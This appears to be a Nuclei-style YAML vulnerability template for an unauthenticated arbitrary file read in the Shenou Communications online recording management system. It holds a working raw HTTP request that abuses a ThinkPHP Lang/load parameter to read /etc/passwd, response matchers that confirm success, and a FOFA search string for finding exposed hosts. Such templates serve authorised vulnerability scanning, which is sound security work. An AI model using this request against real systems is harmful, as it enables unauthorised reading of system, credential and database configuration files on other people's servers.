http:
    - matchers:
        - condition: and
          part: body
          type: word
          words:
            - root:x:0
            - /bin/false
        - status:
            - 500
          type: status
      matchers-condition: and
      raw:
        - "GET /callcenter/public/index.php?s=index/\\think\\Lang/load&file=/etc/passwd HTTP/1.1\nHost: {{Hostname}} \nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0\n"
id: shenoutongxin-index_php-File-reading
info:
    author: Superhero
    description: |-
        fofa: title="在线录音管理系统"
        申瓯通信在线录音管理系统 index.php 接口处任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
    name: 申瓯通信 在线录音管理系统 index.php 任意文件读取漏洞
    reference:
        - https://mp.weixin.qq.com/s/CKCdqsVw2hfTstC_qdDVFg
    severity: high
    tags:
        - File reading
        - thin
        - 申瓯通信
